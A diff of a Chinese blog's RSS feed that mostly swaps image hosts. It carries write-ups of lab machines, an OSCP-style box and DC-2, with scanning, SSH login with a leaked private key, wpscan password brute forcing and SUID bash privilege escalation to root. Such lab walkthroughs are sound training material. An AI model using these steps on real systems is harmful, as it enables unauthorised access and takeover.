+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230622133718432.png&#34; alt=&#34;image-20230622133718432&#34; /&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;nmap -sV -p- 192.168.112.133
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;直接扫开放端口&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230622133838823.png&#34; alt=&#34;image-20230622133838823&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230622133838823.png&#34; alt=&#34;image-20230622133838823&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;发现开放 &lt;code&gt;22&lt;/code&gt;   &lt;code&gt;80&lt;/code&gt;  端口，先打开浏览器探测 &lt;code&gt;80&lt;/code&gt;  端口有什么信息&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230622134133895.png&#34; alt=&#34;image-20230622134133895&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230622134133895.png&#34; alt=&#34;image-20230622134133895&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;Oh yea! Almost forgot the only user on this box is “oscp”.&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;可以看到这里提示用户名只有 &lt;code&gt;oscp&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;先照例给他做个目录扫描探测下藏有什么文件&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230622134420424.png&#34; alt=&#34;image-20230622134420424&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230622134420424.png&#34; alt=&#34;image-20230622134420424&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;扫出很多东西，我们主要看 &lt;code&gt;robots.txt&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230622134539426.png&#34; alt=&#34;image-20230622134539426&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230622134539426.png&#34; alt=&#34;image-20230622134539426&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;发现这个奇怪的文本，继续访问&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230622134617634.png&#34; alt=&#34;image-20230622134617634&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230622134617634.png&#34; alt=&#34;image-20230622134617634&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这是一段编码，看到最后 == 结尾特征，判断为 base64，解码得到一串私钥&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230622134856959.png&#34; alt=&#34;image-20230622134856959&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230622134856959.png&#34; alt=&#34;image-20230622134856959&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;想起了之前扫出的开放端口就有 &lt;code&gt;22&lt;/code&gt;  端口，还有用户名 &lt;code&gt;oscp&lt;/code&gt;&lt;/p&gt;
 &lt;h3 id=&#34;登陆&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#登陆&#34;&gt;#&lt;/a&gt; 登陆&lt;/h3&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230622135309831.png&#34; alt=&#34;image-20230622135309831&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230622135309831.png&#34; alt=&#34;image-20230622135309831&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;将私钥编辑到文件里，并给予权限&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230622135510847.png&#34; alt=&#34;image-20230622135510847&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230622135510847.png&#34; alt=&#34;image-20230622135510847&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这里给 777 权限，是因为权限给太高了&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;chmod&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;600&lt;/span&gt; rsa_key&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; rsa_key oscp@192.168.112.133&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230622135623322.png&#34; alt=&#34;image-20230622135623322&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;chmod&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;600&lt;/span&gt; rsa_key&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-i&lt;/span&gt; rsa_key oscp@192.168.112.133&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230622135623322.png&#34; alt=&#34;image-20230622135623322&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这样就成功连接上了，发现还只是个普通用户的权限&lt;/p&gt;
 &lt;h3 id=&#34;提权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#提权&#34;&gt;#&lt;/a&gt; 提权&lt;/h3&gt;
 &lt;p&gt;这里我们查找一下哪些工具具有 root 权限&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; / &lt;span class=&#34;token parameter variable&#34;&gt;-perm&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;s &lt;span class=&#34;token operator&#34;&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;/dev/null&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230622135909671.png&#34; alt=&#34;image-20230622135909671&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;find&lt;/span&gt; / &lt;span class=&#34;token parameter variable&#34;&gt;-perm&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;s &lt;span class=&#34;token operator&#34;&gt;&lt;span class=&#34;token file-descriptor important&#34;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;/dev/null&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230622135909671.png&#34; alt=&#34;image-20230622135909671&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;可以看到有个 &lt;code&gt;bash&lt;/code&gt; ，利用 SUID 提权&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI3MjYxNy5odG1s&#34;&gt;SUID 提权&lt;/span&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-bash-5.0$ /usr/bin/bash &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bash-5.0&lt;span class=&#34;token comment&#34;&gt;# whoami&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;root&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bash-5.0&lt;span class=&#34;token comment&#34;&gt;# cd /root&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bash-5.0&lt;span class=&#34;token comment&#34;&gt;# ls&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fix-wordpress  flag.txt  snap&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bash-5.0&lt;span class=&#34;token comment&#34;&gt;# cat flag.txt&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d73b04b0e696b0945283defa3eee4538&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bash-5.0&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230622140125681.png&#34; alt=&#34;image-20230622140125681&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-bash-5.0$ /usr/bin/bash &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bash-5.0&lt;span class=&#34;token comment&#34;&gt;# whoami&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;root&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bash-5.0&lt;span class=&#34;token comment&#34;&gt;# cd /root&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bash-5.0&lt;span class=&#34;token comment&#34;&gt;# ls&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;fix-wordpress  flag.txt  snap&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bash-5.0&lt;span class=&#34;token comment&#34;&gt;# cat flag.txt&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;d73b04b0e696b0945283defa3eee4538&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;bash-5.0&lt;span class=&#34;token comment&#34;&gt;#&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230622140125681.png&#34; alt=&#34;image-20230622140125681&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;成功拿到 flag&lt;/p&gt;
  ]]></description>
         </item>
         <item>
-            <guid isPermalink="true">http://k1nako.github.io/DC-2%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
+            <guid isPermalink="true">http://k1nakoo.github.io/DC-2%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
             <title>DC-2 渗透测试</title>
-            <link>http://k1nako.github.io/DC-2%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
-            <category term="靶场" scheme="http://k1nako.github.io/categories/%E9%9D%B6%E5%9C%BA/" />
-            <category term="靶场复现" scheme="http://k1nako.github.io/tags/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" />
+            <link>http://k1nakoo.github.io/DC-2%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
+            <category term="靶场" scheme="http://k1nakoo.github.io/categories/%E9%9D%B6%E5%9C%BA/" />
+            <category term="靶场复现" scheme="http://k1nakoo.github.io/tags/%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/" />
             <pubDate>Sat, 10 Jun 2023 16:04:33 +0800</pubDate>
             <description><![CDATA[ &lt;p&gt;DC 靶场系列&lt;/p&gt;
 &lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
@@ -207,7 +207,7 @@
 &lt;p&gt;用 vmware 虚拟机打开此文件&lt;/p&gt;
 &lt;p&gt;如提示导入失败，点击重试即可&lt;/p&gt;
 &lt;p&gt;kali 和靶机得网络连接模式都改为 NAT 模式，不然 kali 扫不出靶机的 ip&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230606211955678.png&#34; alt=&#34;image-20230606211955678&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230606211955678.png&#34; alt=&#34;image-20230606211955678&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;二-渗透过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-渗透过程&#34;&gt;#&lt;/a&gt; 二、渗透过程&lt;/h2&gt;
 &lt;p&gt;&lt;strong&gt;攻击机 (kali) ip&lt;/strong&gt;：192.168.112.130&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;靶机 (DC-2) ip&lt;/strong&gt;：192.168.112.131&lt;/p&gt;
@@ -215,46 +215,46 @@
 &lt;h4 id=&#34;探测目标ip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#探测目标ip&#34;&gt;#&lt;/a&gt; 探测目标 ip&lt;/h4&gt;
 &lt;p&gt;&lt;strong&gt;arp-scan&lt;/strong&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;arp-scan &lt;span class=&#34;token parameter variable&#34;&gt;-l&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;探测出靶机 ip&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610144505326.png&#34; alt=&#34;image-20230610144505326&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610144505326.png&#34; alt=&#34;image-20230610144505326&#34; /&gt;&lt;/p&gt;
 &lt;h4 id=&#34;探测目标端口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#探测目标端口&#34;&gt;#&lt;/a&gt; 探测目标端口&lt;/h4&gt;
 &lt;p&gt;利用 &lt;code&gt;nmap&lt;/code&gt;  扫描靶机端口&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-sV&lt;/span&gt; -p- &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.112.131&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610144701953.png&#34; alt=&#34;image-20230610144701953&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;nmap &lt;span class=&#34;token parameter variable&#34;&gt;-sV&lt;/span&gt; -p- &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.112.131&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610144701953.png&#34; alt=&#34;image-20230610144701953&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;扫出了两个端口 &lt;code&gt;80&lt;/code&gt;   &lt;code&gt;7744&lt;/code&gt; ，其中 &lt;code&gt;7744&lt;/code&gt;  是 ssh 端口&lt;/p&gt;
 &lt;h3 id=&#34;爆破账号密码&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#爆破账号密码&#34;&gt;#&lt;/a&gt; 爆破账号密码&lt;/h3&gt;
 &lt;p&gt;因为 &lt;code&gt;80&lt;/code&gt;  是 http 协议，所以用浏览器打开&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610145259152.png&#34; alt=&#34;image-20230610145259152&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610145259152.png&#34; alt=&#34;image-20230610145259152&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;可以很明显的看到这一次的靶场是 Wordpress cms&lt;/p&gt;
 &lt;p&gt;当前界面还有 &lt;code&gt;Flag&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610145707537.png&#34; alt=&#34;image-20230610145707537&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610145707537.png&#34; alt=&#34;image-20230610145707537&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;看到个 &lt;code&gt;cewl&lt;/code&gt; ，此工具是生成字典用的，说明提示让我们扒一下字典&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N5c3RlbWluby9hcnRpY2xlL2RldGFpbHMvOTAxMTQ2MTA=&#34;&gt;Cewl 使用&lt;/span&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cewl http://dc-2 &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; passwd.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610150204244.png&#34; alt=&#34;image-20230610150204244&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;cewl http://dc-2 &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; passwd.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610150204244.png&#34; alt=&#34;image-20230610150204244&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;并且我们知道此靶机是 Wordpress cms&lt;/p&gt;
 &lt;p&gt;就可以利用 kali 的 &lt;code&gt;wpscan&lt;/code&gt;  专门用来扫 Wordpress&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDk3MjU2NDU=&#34;&gt;WPScan 的使用&lt;/span&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;枚举用户名&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wpscan &lt;span class=&#34;token parameter variable&#34;&gt;--url&lt;/span&gt; http://dc-2/ &lt;span class=&#34;token parameter variable&#34;&gt;-e&lt;/span&gt; u&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610150537974.png&#34; alt=&#34;image-20230610150537974&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wpscan &lt;span class=&#34;token parameter variable&#34;&gt;--url&lt;/span&gt; http://dc-2/ &lt;span class=&#34;token parameter variable&#34;&gt;-e&lt;/span&gt; u&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610150537974.png&#34; alt=&#34;image-20230610150537974&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;可以看到枚举了三个用户名，我们将他添加进文本里面&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610150900125.png&#34; alt=&#34;image-20230610150900125&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610150900125.png&#34; alt=&#34;image-20230610150900125&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这下账号密码字典都准备就绪&lt;/p&gt;
 &lt;p&gt;利用 &lt;code&gt;wpscan&lt;/code&gt;  爆破出账号密码&lt;/p&gt;
-&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wpscan &lt;span class=&#34;token parameter variable&#34;&gt;--url&lt;/span&gt; http://dc-2/ &lt;span class=&#34;token parameter variable&#34;&gt;--usernames&lt;/span&gt; user.txt &lt;span class=&#34;token parameter variable&#34;&gt;--passwords&lt;/span&gt; passwd.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610151212571.png&#34; alt=&#34;image-20230610151212571&#34; /&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;wpscan &lt;span class=&#34;token parameter variable&#34;&gt;--url&lt;/span&gt; http://dc-2/ &lt;span class=&#34;token parameter variable&#34;&gt;--usernames&lt;/span&gt; user.txt &lt;span class=&#34;token parameter variable&#34;&gt;--passwords&lt;/span&gt; passwd.txt&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://raw.githubusercontent.com/K1nakoo/picture/refs/heads/main/images/image-20230610151212571.png&#34; alt=&#34;image-20230610151212571&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;这下账号密码都有了，去查查后台目录在哪&lt;/p&gt;
 &lt;h3 id=&#34;扫描目录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#扫描目录&#34;&gt;#&lt;/a&gt; 扫描目录&lt;/h3&gt;
 &lt;p&gt;&lt;strong&gt;dirsearch&lt;/strong&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dirsearch &lt;span class=&#34;token parameter variable&#34;&gt;-u&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;url&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;dirb&lt;/strong&gt;&lt;/p&gt;
 &lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dirb url&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里以 &lt;code&gt;dirsearch&lt;/code&gt;  为例&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;http://www.k1nako.top/images/image-20230610151958274.png&#34; alt=&#34;image-20230610151958274&#34; /&gt;&lt;/p&gt;
